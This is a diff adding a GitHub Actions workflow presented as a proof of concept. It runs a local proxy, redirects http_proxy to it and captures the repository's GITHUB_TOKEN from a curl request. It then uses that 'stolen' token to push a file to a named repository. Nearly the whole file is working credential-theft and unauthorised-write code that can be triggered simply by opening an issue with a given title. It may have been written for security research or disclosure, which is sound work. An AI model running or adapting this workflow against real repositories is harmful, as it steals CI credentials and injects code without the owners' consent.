@@ -1,0 +1,61 @@
+name: Code injection via captured token
+on:
+  issues:
+    types: [opened]
+
+permissions: write-all
+
+jobs:
+  code-inject:
+    runs-on: ubuntu-latest
+    if: contains(github.event.issue.title, 'code-inject-proof')
+    steps:
+      - name: Capture token via proxy
+        run: |
+          cat > /tmp/proxy.py << 'PYEOF'
+          import http.server, socketserver
+          class H(http.server.BaseHTTPRequestHandler):
+              def do_GET(self):
+                  auth = self.headers.get('Authorization','')
+                  with open('/tmp/token.txt','w') as f: f.write(auth)
+                  self.send_response(502); self.end_headers(); self.wfile.write(b"ok")
+              do_POST = do_GET
+              def log_message(self,*a): pass
+          with socketserver.TCPServer(("127.0.0.1",18080),H) as s: s.handle_request()
+          PYEOF
+          python3 /tmp/proxy.py &
+          sleep 1
+          echo "http_proxy=http://127.0.0.1:18080" >> $GITHUB_ENV
+
+      - name: Token captured
+        run: |
+          curl --max-time 5 -sS -H "Authorization: token $GITHUB_TOKEN" \
+            "http://api.github.com/user" 2>&1 || true
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Push commit with captured write-all token
+        run: |
+          unset http_proxy https_proxy
+          STOLEN=$(sed 's/token //' /tmp/token.txt)
+          
+          echo "=== Using captured write-all token to create a file ==="
+          # Create a file via the Contents API (proves write/push access)
+          CONTENT=$(echo "This file was created using a GITHUB_TOKEN captured via http_proxy MITM.\nTimestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)\nProof of code injection capability." | base64 -w0)
+          
+          RESULT=$(curl -sS -X PUT \
+            -H "Authorization: token $STOLEN" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/toofikz/public-test-repo/contents/MITM-CODE-INJECTION-PROOF.txt" \
+            -d "{\"message\":\"[PoC] Code injected via captured GITHUB_TOKEN\",\"content\":\"$CONTENT\"}" 2>&1)
+          
+          COMMIT_SHA=$(echo "$RESULT" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('commit',{}).get('sha','FAILED'))" 2>/dev/null)
+          
+          if [ "$COMMIT_SHA" != "FAILED" ] && [ -n "$COMMIT_SHA" ]; then
+            echo "CRITICAL: CODE INJECTED! Commit SHA: $COMMIT_SHA"
+            echo "File MITM-CODE-INJECTION-PROOF.txt was pushed to the repo"
+            echo "using a GITHUB_TOKEN captured via http_proxy MITM"
+          else
+            echo "Push failed (might need contents: write in workflow permissions)"
+            echo "$RESULT" | head -5
+          fi
